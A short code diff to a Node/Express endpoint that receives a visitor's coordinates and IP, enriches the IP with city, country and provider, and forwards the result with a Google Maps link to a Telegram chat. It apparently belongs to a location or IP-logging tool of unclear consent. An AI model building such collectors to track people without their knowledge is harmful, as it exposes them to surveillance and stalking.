@@ -29,21 +29,28 @@ app.post("/send-location", async (req, res) => {
   const ip = req.headers['x-forwarded-for'] || req.ip;
   const ipInfo = await enrichIP(ip);
 
+  const mapsLink = latitude && longitude 
+    ? `[Ver no Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`
+    : "Coordenadas não disponíveis";
+
   const message = `
-📍 Localização Recebida:
+📍 *Localização Recebida:*
 Latitude: ${latitude || "Não obtida"}
 Longitude: ${longitude || "Não obtida"}
 
-🌐 IP: ${ip}
-🏙 Cidade: ${ipInfo.city || "N/A"}
-🏳 País: ${ipInfo.country || "N/A"}
-📡 Provedor: ${ipInfo.isp || "N/A"}
+🌐 *IP:* ${ip}
+🏙 *Cidade:* ${ipInfo.city || "N/A"}
+🏳 *País:* ${ipInfo.country || "N/A"}
+📡 *Provedor:* ${ipInfo.isp || "N/A"}
+
+🔗 ${mapsLink}
   `;
 
   try {
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       chat_id: TELEGRAM_CHAT_ID,
       text: message,
+      parse_mode: 'Markdown'
     });
 
     res.status(200).json({ success: true });
